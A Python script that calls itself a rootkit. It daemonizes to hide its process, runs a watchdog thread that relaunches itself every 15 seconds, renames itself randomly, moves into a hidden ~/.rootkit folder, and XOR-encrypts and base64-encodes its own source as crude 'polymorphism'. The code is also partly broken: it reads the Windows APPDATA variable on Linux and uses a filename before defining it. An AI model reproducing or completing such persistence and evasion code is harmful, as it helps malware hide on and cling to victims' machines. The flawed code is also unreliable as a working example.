import os
import sys
import time
import threading
import random
import string
import base64
import atexit

# Changed to Linux-compatible hidden directory
LOCK_FILE = os.path.expanduser("~/.rootkit/rootkit.lock")

def usun_blokade():
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except Exception:
        pass

# Removed Windows registry functions completely

def hide_process():
    # Linux process hiding using fork and backgrounding
    if os.fork() > 0:
        sys.exit(0)
    os.setsid()
    if os.fork() > 0:
        sys.exit(0)

def monitor_process():
    while True:
        try:
            with open(LOCK_FILE, 'r') as f:
                pid = int(f.read())
                if not os.path.exists(f"/proc/{pid}"):
                    os.system(f"nohup python3 {os.path.expanduser('~/.rootkit/'+new_name)} &>/dev/null &")
        except Exception:
            os.system(f"nohup python3 {os.path.expanduser('~/.rootkit/'+new_name)} &>/dev/null &")
        time.sleep(15)

def polymorphism(code):
    # Perform polymorphism on the code
    encoded_code = base64.b64encode(code.encode()).decode()
    return encoded_code

def encrypt(code):
    # Encrypt the code
    encrypted_code = ''.join(chr(ord(c) ^ 0x50) for c in code)
    return encrypted_code

# Generate a random name for the script
def generate_random_name():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + '.py'

# Start the monitoring thread
monitor_thread = threading.Thread(target=monitor_process)
monitor_thread.start()

# Hide the current process
hide_process()

# Rename and move the script to a hidden directory
new_name = generate_random_name()
os.rename(sys.argv[0], new_name)
os.system(f"mkdir -p ~/.rootkit && mv {new_name} ~/.rootkit/")

# Encrypt and polymorph the code
with open(os.path.join(os.getenv('APPDATA'), '.rootkit', new_name), 'r') as f:
    code = f.read()
    encrypted_code = encrypt(code)
    polymorphic_code = polymorphism(encrypted_code)

with open(os.path.join(os.getenv('APPDATA'), '.rootkit', new_name), 'w') as f:
    f.write(polymorphic_code)

# Daemonize instead of simple sleep loop
hide_process()
while True:
    time.sleep(3600)  # Reduced wake frequency for Linux